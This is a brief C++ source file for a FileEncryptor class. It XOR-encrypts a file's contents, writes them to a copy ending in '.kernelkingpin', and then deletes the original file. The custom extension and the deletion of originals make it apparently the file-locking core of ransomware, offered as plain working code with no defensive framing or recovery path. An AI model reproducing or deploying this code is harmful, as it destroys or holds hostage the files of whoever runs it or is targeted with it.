#include "FileEncryption.h"
#include <fstream>
#include <iostream>
#include <filesystem>

void FileEncryptor::xorEncrypt(std::string &data, const std::string &key) {
  for (size_t i = 0; i < data.size(); ++i) {
    data[i] ^= key[i % key.size()];
  }
}

void FileEncryptor::encryptFile(const std::string &filePath) {
  // Read file
  std::ifstream inputFile(filePath, std::ios::binary);
  std::string fileData((std::istreambuf_iterator<char>(inputFile)),
                       std::istreambuf_iterator<char>());
  inputFile.close();

  // Encrypt data
  xorEncrypt(fileData, key);

  // Write encrypted data to new file with .kernelkingpin extension
  std::string newFilePath = filePath + ".kernelkingpin";
  std::ofstream outputFile(newFilePath, std::ios::binary);
  outputFile.write(fileData.data(), fileData.size());
  outputFile.close();

  // Remove original file
  std::filesystem::remove(filePath);
}

void FileEncryptor::encrypt(const std::string &filePath) {
  encryptFile(filePath);
}
